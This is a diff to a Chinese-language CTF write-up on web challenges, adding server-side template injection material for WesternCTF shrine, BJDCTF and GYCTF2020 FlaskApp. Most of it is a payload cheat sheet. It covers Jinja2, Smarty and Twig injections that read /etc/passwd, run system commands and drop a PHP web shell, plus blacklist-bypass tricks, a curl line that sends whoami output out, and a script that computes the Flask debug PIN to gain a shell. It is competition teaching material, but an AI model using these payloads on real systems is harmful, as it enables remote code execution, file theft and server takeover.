@@ -784,9 +784,8 @@ servlet包含了路径信息，我们尝试包含一下FlagController所在路�
 
         payload: `?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:19;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'`
 
-## BJDCTF2020 The mystery of ip/Cookie is so stable
-
-- WesternCTF2018 shrine(SSTI)
+## SSIT(服务端模板注入)
+### WesternCTF2018 shrine
 
     源码
 
@@ -854,9 +853,11 @@ servlet包含了路径信息，我们尝试包含一下FlagController所在路�
 
   注入`{{url_for.__globals__['current_app'].config}}`获取flag
 
+### BJDCTF2020 The mystery of ip/Cookie is so stable
+
 1. 考点
 
-    1. X-Forwarded-For注入(The mystery of ip)
+    1. X-Forwarded-For注入(The mystery of **ip**)
 
        cookie注入(Cookie is so stable)
     2. PHP可能存在Twig模版注入漏洞，Flask可能存在Jinjia2模版注入漏洞
@@ -872,142 +873,172 @@ servlet包含了路径信息，我们尝试包含一下FlagController所在路�
     这里的绿线表示结果成功返回，红线反之
 
     ```txt
-        {{7*'7'}} 回显7777777 ==> Jinja2
-        {{7*'7'}} 回显49 ==> Twig
+    {{7*'7'}} 回显7777777 ==> Jinja2
+    {{7*'7'}} 回显49 ==> Twig
     ```
 
-    [SSTI 服务器端模板注入(Server-Side Template Injection)](https://www.cnblogs.com/bmjoker/p/13508538.html)
+### GYCTF2020 FlaskApp
 
-    [关于SSTI注入](https://xz.aliyun.com/t/11090?time__1311=mqmx0DyDuDBGuD0vo4%2BxaLm44iq40KqG8eD&alichlgref=https%3A%2F%2Fwww.google.com%2F)
+1. 题目提示flask，可以尝试一下**SSIT**
+  
+  加密页面输入`{{2+2}}`页面正常返回base64加密后的密文，复制密文放到解码页面，得到结果4==>注入点在解码页面
 
-    SSTI payload:
+2. 在解密页面随便输入引发报错得到解码页面后端处理逻辑，发现有waf防护
+   
+   查看源码 `{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}`
 
-    smarty
+   waf 黑名单：`black_list = ["flag","os","system","popen","import","eval","chr","request", "subprocess","commands","socket","hex","base64","*","?"]`
 
-    ```smarty
-        {if phpinfo()}{/if}
-        {if readfile(‘文件路径’)}{/if}
-        {if show_source(‘文件路径’)}{/if}
-        {if passthru(‘操作命令’)}{/if}
-        {if system(‘操作命令’)}{/if}
-    ```
+3. waf绕过方法有很多，字符串拼接、逆序等。
+   
+   字符串拼接：`{{c.__init__.__globals__.['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}`
 
-    Jinja2
+   逆序：`{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}`
 
-    ```python
-        # Jinja2
-        获得基类
-        #python2.7
-        ''.__class__.__mro__[2]
-        {}.__class__.__bases__[0]
-        ().__class__.__bases__[0]
-        [].__class__.__bases__[0]
-        request.__class__.__mro__[1]
-        #python3.7
-        ''.__。。。class__.__mro__[1]
-        {}.__class__.__bases__[0]
-        ().__class__.__bases__[0]
-        [].__class__.__bases__[0]
-        request.__class__.__mro__[1]
 
-        #python 2.7
-        #文件操作
-        #找到file类
-        [].__class__.__bases__[0].__subclasses__()[40]
-        #读文件
-        [].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
-        #写文件
-        [].__class__.__bases__[0].__subclasses__()[40]('/tmp').write('test')
 
-        #命令执行
-        #os执行
-        # [].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：
-        # popen('id')中的id可换成其他Linux命令
-        [].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()
-        #eval,impoer等全局函数
-        #[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__ 下有eval，__import__等的全局函数，可以利用此来执行命令：
-        [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
-        [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
-        [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
-        [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
+### SSTI payload:
 
-        #python3.7
-        #命令执行
-        {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
-        #文件操作
-        {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
-        #windows下的os命令
-        "".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()
-    ```
+[SSTI 服务器端模板注入(Server-Side Template Injection)](https://www.cnblogs.com/bmjoker/p/13508538.html)
 
-    Jinja2一些绕过WAF姿势
+[关于SSTI注入](https://xz.aliyun.com/t/11090?time__1311=mqmx0DyDuDBGuD0vo4%2BxaLm44iq40KqG8eD&alichlgref=https%3A%2F%2Fwww.google.com%2F)
 
-    过滤 "["
+smarty
 
-    ```python
-        #getitem、pop
-        ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
-        ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()
-    ```
+```php
+    {if phpinfo()}{/if}
+    {if readfile(‘文件路径’)}{/if}
+    {if show_source(‘文件路径’)}{/if}
+    {if passthru(‘操作命令’)}{/if}
+    {if system(‘操作命令’)}{/if}
+```
 
-    过滤引号
+Jinja2
 
-    ```python
-        #chr函数
-        {% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
-        {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()}}#request对象
-        {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&path=/etc/passwd
-        #命令执行
-        {% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
-        {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }}
-        {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&cmd=id
-    ```
+```python
+__class__         返回调用的参数类型
+__bases__         返回基类列表
+__mro__           此属性是在方法解析期间寻找基类时的参考类元组
+__subclasses__()  返回子类的列表
+__globals__       以字典的形式返回函数所在的全局命名空间所定义的全局变  量 与 func_globals 等价
+__builtins__      内建模块的引用，在任何地方都是可见的(包括全局)，每个 Python 脚本都会自动加载，这个模块包括了很多强大的 built-in 函数，例如eval, exec, open等等
+```
 
-    过滤下划线
 
-    ```python
-        {{''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__
-    ```
+```python
+    # Jinja2
+    获得基类
+    #python2.7
+    ''.__class__.__mro__[2]
+    {}.__class__.__bases__[0]
+    ().__class__.__bases__[0]
+    [].__class__.__bases__[0]
+    request.__class__.__mro__[1]
+    #python3.7
+    ''.__。。。class__.__mro__[1]
+    {}.__class__.__bases__[0]
+    ().__class__.__bases__[0]
+    [].__class__.__bases__[0]
+    request.__class__.__mro__[1]
 
-    过滤花括号
+    #python 2.7
+    #文件操作
+    #找到file类
+    [].__class__.__bases__[0].__subclasses__()[40]
+    #读文件
+    [].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
+    #写文件
+    [].__class__.__bases__[0].__subclasses__()[40]('/tmp').write('test')
 
-    ```python
-        #用{%%}标记
-        {% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
-    ```
+    #命令执行
+    #os执行
+    # [].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：
+    # popen('id')中的id可换成其他Linux命令
+    [].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()
+    #eval,impoer等全局函数
+    #[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__ 下有eval，__import__等的全局函数，可以利用此来执行命令：
+    [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
+    [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
+    [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
+    [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
 
-    过滤class,subclass等关键字:可以用request.args绕过
+    #python3.7
+    #命令执行
+    {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
+    #文件操作
+    {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
+    #windows下的os命令
+    "".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()
+```
 
-    ```python
-    [request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()?a=__class__&b=__mro__&c=__subclasses__&d=read
-    ```
+Jinja2一些绕过WAF姿势
 
-    Twig
+过滤 "["
 
-    ```python
-        {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}} # 其中id可以更换为系统命令
-        {{'/etc/passwd'|file_excerpt(1,30)}}
+```python
+    #getitem、pop
+    ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
+    ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()
+```
 
-        {{app.request.files.get(1).__construct('/etc/passwd','')}}
+过滤引号
 
-        {{app.request.files.get(1).openFile.fread(99)}}
+```python
+    #chr函数
+    {% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
+    {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()}}#request对象
+    {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&path=/etc/passwd
+    #命令执行
+    {% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
+    {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }}
+    {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&cmd=id
+```
 
-        {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
+过滤下划线
 
-        {{_self.env.enableDebug()}}{{_self.env.isDebug()}}
+```python
+    {{''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__
+```
 
-        {{["id"]|map("system")|join(",")}}
+过滤花括号
 
-        {{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}
+```python
+    #用{%%}标记
+    {% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
+```
 
-        {{["id",0]|sort("system")|join(",")}}
+过滤class,subclass等关键字:可以用request.args绕过
 
-        {{["id"]|filter("system")|join(",")}}
+```python
+[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()?a=__class__&b=__mro__&c=__subclasses__&d=read
+```
 
-        {{[0,0]|reduce("system","id")|join(",")}}
+Twig
 
-        {{['cat /etc/passwd']|filter('system')}}
-    ```
+```python
+    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}} # 其中id可以更换为系统命令
+    {{'/etc/passwd'|file_excerpt(1,30)}}
+
+    {{app.request.files.get(1).__construct('/etc/passwd','')}}
+
+    {{app.request.files.get(1).openFile.fread(99)}}
+
+    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
+
+    {{_self.env.enableDebug()}}{{_self.env.isDebug()}}
+
+    {{["id"]|map("system")|join(",")}}
+
+    {{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}
+
+    {{["id",0]|sort("system")|join(",")}}
+
+    {{["id"]|filter("system")|join(",")}}
+
+    {{[0,0]|reduce("system","id")|join(",")}}
+
+    {{['cat /etc/passwd']|filter('system')}}
+```
 
 ## 网鼎杯2020 朱雀组 php web(反序列化)
 
@@ -2603,3 +2634,91 @@ url解码之后就是 `?code=phpinfo();`
                 break
     print(flag)
     ```
+
+## GYCTF2020 FlaskAPP
+
+[Flask debug模式下的 PIN 码安全性](https://xz.aliyun.com/t/8092?time__1311=n4%2BxuDgDBADQYiKP40HwbDyiGDkDciiGmpcpoD&alichlgref=https%3A%2F%2Flink.csdn.net%2F%3Ftarget%3Dhttps%253A%252F%252Fxz.aliyun.com%252Ft%252F8092)
+
+1. 题目类型判断 ---> [SSIT](#gyctf2020-flaskapp)
+   
+   这里主要写一下Flask Debug模式利用PIN码获取shell执行权
+
+2. PIN码获取
+   
+   PIN 主要由 probably_public_bits 和 private_bits 两个列表变量决定，而这两个列表变量又由如下6个变量决定：
+
+   ```python
+   username 启动这个 Flask 的用户
+   modname 一般默认 flask.app
+   getattr(app, '__name__', getattr(app.__class__, '__name__')) 一般默认 flask.app 为 Flask
+   getattr(mod, '__file__', None)为 flask 目录下的一个 app.py 的绝对路径,可在爆错页面看到
+   str(uuid.getnode()) 则是网卡 MAC 地址的十进制表达式
+   get_machine_id() 系统 id
+   ```
+   
+   `modname` 一般默认 `flask.app`，`getattr(app, '__name__', getattr(app.__class__, '__name__'))`一般默认 flask.app 为 Flask，所以主要获取剩下的4个变量即可。
+   
+   本题中，首先通过报错就可以得知很多信息，Python3的环境以及
+   
+   ```python
+   modname：flask.app
+   getattr(app, '__name__', getattr(app.__class__, '__name__'))：Flask
+   getattr(mod, '__file__', None)：/usr/local/lib/python3.7/site-packages/flask/app.py
+   # 注意python2中为app.pyc
+   ```
+
+   接下来可以通过SSTI去文件读取其他信息，使用jinja2的控制结构语法构造。
+
+   username：`{{x.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}`
+
+   MAC地址(要转化为十进制)：`{{x.__init__.__globals__['__builtins__'].open('/sys/class/net/eth0/address').read() }}`
+
+   系统id：`{{x.__init__.__globals__['__builtins__'].open('/etc/machine-id').read() }}`
+
+   生成PIN的脚本：
+
+   ```python
+    import hashlib
+    from itertools import chain
+    probably_public_bits = [
+        'flaskweb'# username
+        'flask.app',# modname
+        'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
+        '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
+    ]
+
+    private_bits = [
+        '231530469832647',# str(uuid.getnode()),  /sys/class/net/eth0/address
+        '1408f836b0ca514d796cbf8960e45fa1'# get_machine_id(), /etc/machine-id
+    ]
+
+    h = hashlib.md5()
+    for bit in chain(probably_public_bits, private_bits):
+        if not bit:
+            continue
+        if isinstance(bit, str):
+            bit = bit.encode('utf-8')
+        h.update(bit)
+    h.update(b'cookiesalt')
+
+    cookie_name = '__wzd' + h.hexdigest()[:20]
+
+    num = None
+    if num is None:
+        h.update(b'pinsalt')
+        num = ('%09d' % int(h.hexdigest(), 16))[:9]
+
+    rv =None
+    if rv is None:
+        for group_size in 5, 4, 3:
+            if len(num) % group_size == 0:
+                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+                            for x in range(0, len(num), group_size))
+                break
+        else:
+            rv = num
+
+    print(rv)
+   ```
+
+   得到PIN码后，利用python执行系统命令`os.popen('系统命令').read()`获取flag，如：`os.popen('cat /this_is_the_flag.txt').read()`
